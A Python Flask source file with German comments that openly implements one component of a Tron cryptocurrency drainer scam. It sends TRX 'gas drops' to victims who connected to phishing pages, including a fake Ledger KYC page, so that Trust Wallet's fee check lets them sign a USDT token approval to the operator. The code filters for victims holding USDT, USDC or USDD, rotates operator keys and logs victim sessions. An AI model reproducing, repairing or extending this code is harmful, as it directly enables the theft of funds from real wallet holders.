"""
Auto Gas-Drop — TWs Fee-Guard verlangt sichtbare TRX-Balance auf der
Opfer-Wallet ("You don't have enough Tron …" / deaktivierter Confirm).
Delegierte Energy zählt in TWs Check NICHT; externe Rentals (TronNRG)
sind kurzlebig und teurer als TWs eigenes In-Sheet-Rental (~1.6 TRX).

Darum: ein simpler TRX-Transfer vom Operator an das Opfer beim Connect.
TWs Guard gibt frei, das Opfer bestätigt — und zahlt selbst (der
eigentliche Scam-Weg; über TWs In-Sheet-Rental sogar billig).

  POST /api/energy {step:"pay", victim:"T…"}
      → Guards prüfen → signierter TRX-Transfer Operator→Victim,
        return {gas_tx}
  step:"claim" bleibt als Noop-Compat (alte Frontend-Poller).

Guards: Admin-Toggle (sim aus), valide Adresse, frisches Session-Event
(<15min), Opfer muss Token-Guthaben haben (Approve auf leere Wallet
ist wertlos). Keine Mengen-Limits — jede Wallet mit < GAS_MIN bekommt
den Top-up automatisch, beliebig oft.
"""
import json, os, time, urllib.request
from datetime import datetime, timezone
from flask import Flask, request, jsonify
import base58
from eth_keys import keys as eth_keys

app = Flask(__name__)

TG = "https://api.trongrid.io"
TG_ALT = "https://api.tronstack.io"  # Fallback bei 403/429/5xx (wie pull.py)
# Gas-Drop: TWs Fee-Guard verlangt sichtbares TRX-Guthaben auf der Opfer-
# Wallet — delegierte Energy zählt dort NICHT (empirisch). Opfer mit
# < GAS_MIN_TRX Balance bekommen GAS_TRX — danach gibt der Guard frei und
# das Opfer zahlt selbst (In-Sheet-Rental ~2.3 TRX oder direkter Burn).
# Bemessung: ein USDT-increaseApproval braucht ~105k Energy ≈ 10,5 TRX Burn.
# 8 TRX deckte das nicht — gedroppte Opfer fielen am Coverage-Gate durch.
# 13 TRX Puffer + Threshold 12: bal+Drop >= 13 TRX = ~130k burnbare Energy.
GAS_TRX = float(os.environ.get("ENERGY_GAS_TRX", "13"))
GAS_MIN_SUN = int(float(os.environ.get("ENERGY_GAS_MIN_TRX", "12")) * 1e6)
EVENTS_KEY = "chainscaner:events"
CONFIG_KEY = "chainscaner:config"
PK = (os.environ.get("TRON_OPERATOR_PK") or "").strip()
PK = PK[2:] if PK.startswith("0x") else PK
PK2 = (os.environ.get("TRON_OPERATOR_PK_2") or "").strip()
PK2 = PK2[2:] if PK2.startswith("0x") else PK2
PK3 = (os.environ.get("TRON_OPERATOR_PK_3") or "").strip()
PK3 = PK3[2:] if PK3.startswith("0x") else PK3
RU = os.environ.get("UPSTASH_REDIS_REST_URL", "")
RT = os.environ.get("UPSTASH_REDIS_REST_TOKEN", "")


def _post(url, body, timeout=9):
    req = urllib.request.Request(url, data=json.dumps(body).encode(),
                                 headers={"Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(req, timeout=timeout).read())


def tg(path, body):
    # TronGrid/TronStack droppen intermittierend 403/429 auf den Vercel-IPs
    # (5s-Rate-Limit-Fenster, Feed: energy_result 403 → kein Drop). Einmal
    # ueber das Fenster hinweg retrien statt den Drop sofort aufzugeben.
    try:
        return _post(TG + path, body)
    except Exception:
        pass
    try:
        return _post(TG_ALT + path, body)
    except Exception:
        time.sleep(5)
        return _post(TG + path, body)


def redis(cmds):
    if not RU or not RT:
        return None
    req = urllib.request.Request(RU + "/pipeline", data=json.dumps(cmds).encode(),
                                 headers={"Content-Type": "application/json",
                                          "Authorization": "Bearer " + RT})
    return json.loads(urllib.request.urlopen(req, timeout=6).read())


def b58hex(a):
    return base58.b58decode_check(a).hex()  # 41-prefix + 20 bytes


def valid_addr(a):
    return isinstance(a, str) and len(a) == 34 and a.startswith("T")


def _op_slot():
    # Admin-Dropdown (chainscaner:config tronOperator 1|2|3) — gleiche
    # Auswahl wie pull.py: Gas-Drops kommen vom aktiven Operator.
    try:
        out = redis([["GET", CONFIG_KEY]])
        raw = (out[0] or {}).get("result") if out else None
        cfg = json.loads(raw) if raw else {}
        s = cfg.get("tronOperator")
        return s if s in (1, 2, 3) else 1
    except Exception:
        return 1


def _active_pk():
    s = _op_slot()
    if s == 3 and PK3:
        return PK3
    if s == 2 and PK2:
        return PK2
    return PK


def _key():
    return eth_keys.PrivateKey(bytes.fromhex(_active_pk()))


def op_hex():
    # Tron-Adresse = 0x41 + keccak(pubkey)[-20:] — wie Ethereum, anderer Prefix
    return "41" + _key().public_key.to_canonical_address().hex()


def sign_digest(digest32):
    sig = _key().sign_msg_hash(digest32)
    v, r, s = sig.vrs
    return (r.to_bytes(32, "big") + s.to_bytes(32, "big") + bytes([27 + v])).hex()


def sign_tx(tx):
    # Tron signiert die txID (= sha256(raw_data)) direkt mit secp256k1
    tx["signature"] = [sign_digest(bytes.fromhex(tx["txID"]))]
    return tx


def _log(ev, d):
    # Skip-Gründe/Resultate ins Live-Feed — energy_pay war bislang ein
    # Black-Box: jedes Scheitern war nur clientseitig sichtbar.
    try:
        env = {"at": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S"),
               "ev": {"ev": ev, "d": d}}
        redis([["LPUSH", EVENTS_KEY, json.dumps(env)],
               ["LTRIM", EVENTS_KEY, "0", "199"]])
    except Exception:
        pass


def _ev_age_sec(tstr):
    try:
        ts = datetime.strptime(tstr, "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
        return (datetime.now(timezone.utc) - ts).total_seconds()
    except Exception:
        return 1e9


def has_recent_session(victim):
    """Victim muss in den letzten 15min ein Event geloggt haben."""
    out = redis([["LRANGE", EVENTS_KEY, "0", "199"]])
    rows = (out[0].get("result") if out else None) or []
    for raw in rows:
        try:
            e = json.loads(raw)
        except Exception:
            continue
        if _ev_age_sec(e.get("at", "")) > 900:
            continue
        ev = e.get("ev") or {}
        if (ev.get("ev") or "") not in ("tron_connected", "page_opened",
                                       "guarantee_connected", "guarantee_opened",
                                       # /direct fuehrt dieselbe Allowance-
                                       # Session — ohne diesen Eintrag
                                       # skipte der Drop dort immer.
                                       "direct_connected",
                                       # Der Chainscanner traegt die Opfer-
                                       # Adresse in scan_started/analysis_-
                                       # started/handoff_opened — sein
                                       # page_opened enthaelt sie nicht,
                                       # darum schlug der Session-Check dort
                                       # immer fehl und der Drop nie aus.
                                       "scan_started", "analysis_started",
                                       "handoff_opened",
                                       "tronmask_connected", "tronmask_opened",
                                       # Ledger-KYC-Seite: ledger_connected
                                       # traegt die Hardware-Wallet-Adresse.
                                       "ledger_connected"):
            continue
        if victim in json.dumps(ev.get("d") or {}):
            return True
    return False


TOKEN_CONTRACTS = [
    "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",  # USDT
    "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8",  # USDC
    "TPYmHEhy5n8TCEfYGqW2rPxsghSccghGRn",  # USDD
]


def token_holding(victim):
    """True wenn das Opfer auf USDT/USDC/USDD irgendwo Guthaben hat.
    Ein Approve auf eine token-lose Wallet ist wertlos — kein Drop.
    Alle Reads fehlgeschlagen → fail-open (echten Flow nicht blockieren)."""
    param = "0" * 24 + b58hex(victim)[2:]  # balanceOf(address), 41-Prefix weg
    total, ok = 0, False
    for c in TOKEN_CONTRACTS:
        try:
            r = tg("/wallet/triggerconstantcontract", {
                "owner_address": op_hex(),
                "contract_address": b58hex(c),
                "function_selector": "balanceOf(address)",
                "parameter": param,
            })
            total += int((r.get("constant_result") or ["0"])[0] or "0", 16)
            ok = True
        except Exception:
            continue
    return True if not ok else total > 0


def balance_sun(victim):
    try:
        acct = tg("/wallet/getaccount", {"address": b58hex(victim)})
        return int(acct.get("balance") or 0)
    except Exception:
        return None  # Read-Fehler ≠ leere Wallet — kein Blind-Drop


def send_trx(to_addr, sun):
    """Signierter TRX-Transfer von der Operator-Wallet — dup-tolerant."""
    tx = tg("/wallet/createtransaction", {
        "owner_address": op_hex(),
        "to_address": b58hex(to_addr),
        "amount": int(sun)
    })
    if not tx or not tx.get("raw_data"):
        return None, "build failed: " + json.dumps(tx or {})[:120]
    sign_tx(tx)
    bc = tg("/wallet/broadcasttransaction", tx)
    if not bc.get("result"):
        raw = (bc.get("message") or "")
        try:
            msg = bytes.fromhex(raw).decode()
        except Exception:
            msg = raw
        if "dup" in msg.lower():
            return tx["txID"], None
        # Ambiger Fehler: die Tx kann trotzdem on-chain sein. Ein Blind-Retry
        # baut eine NEUE Tx (anderer Ref-Block → andere txid → kein dup) —
        # ohne Verifikation droht ein Doppel-Drop.
        for attempt in range(3):
            info = tg("/wallet/gettransactioninfobyid",
                      {"value": tx["txID"]}) or {}
            receipt = info.get("receipt") or {}
            if receipt.get("result") == "SUCCESS":
                return tx["txID"], None
            if receipt:
                return None, "tx reverted on-chain: " + str(receipt.get("result"))
            if attempt < 2:
                time.sleep(4)
        return None, "broadcast unclear: " + msg[:120]
    return tx["txID"], None


def tron_allowance_enabled():
    # Admin-Toggle: aus = Sheet-only (sim) — dann wird NICHTS on-chain
    # gemacht, auch kein Gas-Drop an das Opfer. Fail-closed: unlesbare
    # Config zählt als "aus" — nie TRX senden wenn der Modus unklar ist.
    try:
        out = redis([["GET", CONFIG_KEY]])
        if not out:
            return None
        raw = (out[0] or {}).get("result")
        cfg = json.loads(raw) if raw else {}
        # Strict: nur explizit true = an; fehlender Key = aus.
        return cfg.get("tronAllowance") is True
    except Exception:
        return None


def pay(victim, src=None):
    def skip(reason):
        _log("energy_skip", {"victim": victim, "reason": reason})
        return {"skip": reason}

    if not _active_pk():
        return skip("sponsor not configured")
    if tron_allowance_enabled() is not True:
        return skip("sim mode — nothing on-chain")
    if not valid_addr(victim) or b58hex(victim) == op_hex():
        return skip("invalid victim")
    if not has_recent_session(victim):
        return skip("no recent session")
    # Kein Token-Guthaben → Approve waere wertlos → kein Gas verschwenden.
    # Ausnahme src="ledger": die KYC-Ledger-Seite verifiziert Hardware-Wallets,
    # deren USDT oft auf anderen Konten liegt — die Session selbst ist der
    # Wahrheitsanker (ledger_connected im Feed <15min).
    if src != "ledger" and not token_holding(victim):
        return skip("no token balance — approve wäre wertlos")

    # Top-up auf ~13 TRX, nicht flat: ein USDT-Approve braucht ~105k Energy
    # ≈ 10,5 TRX reines Burn (plus 15% Marge des Coverage-Gates). Opfer mit
    # <12 TRX waeren sonst ungedroppt UND ungedeckt → Sheet waere ein
    # guaranteed Fail. Wer >= GAS_MIN hat, deckt selbst.
    bal = balance_sun(victim)
    if bal is None:
        return skip("balance read failed")
    if bal >= GAS_MIN_SUN:
        return skip("balance_ok")
    drop_sun = int(GAS_TRX * 1e6) - bal
    if drop_sun <= 0:
        return skip("balance_ok")

    txid, err = send_trx(victim, drop_sun)
    if err:
        _log("energy_fail", {"victim": victim, "err": err[:160]})
        return {"error": "gas drop failed: " + err}
    _log("energy_sponsored", {"victim": victim, "sun": drop_sun, "tx": txid})
    return {"gas_tx": txid}


def claim(txid):
    # Noop-Compat für alte Frontend-Poller — Rent-Pfad ist entfernt.
    return {"delegated": False, "disabled": True}


@app.route("/api/energy", methods=["POST"])
def energy():
    body = request.get_json(silent=True) or {}
    step = body.get("step")
    try:
        if step == "pay":
            return jsonify(pay(body.get("victim"), body.get("src")))
        if step == "claim":
            return jsonify(claim(body.get("txid")))
        return jsonify({"error": "unknown step"}), 400
    except Exception as e:
        return jsonify({"error": str(e)[:200]}), 502
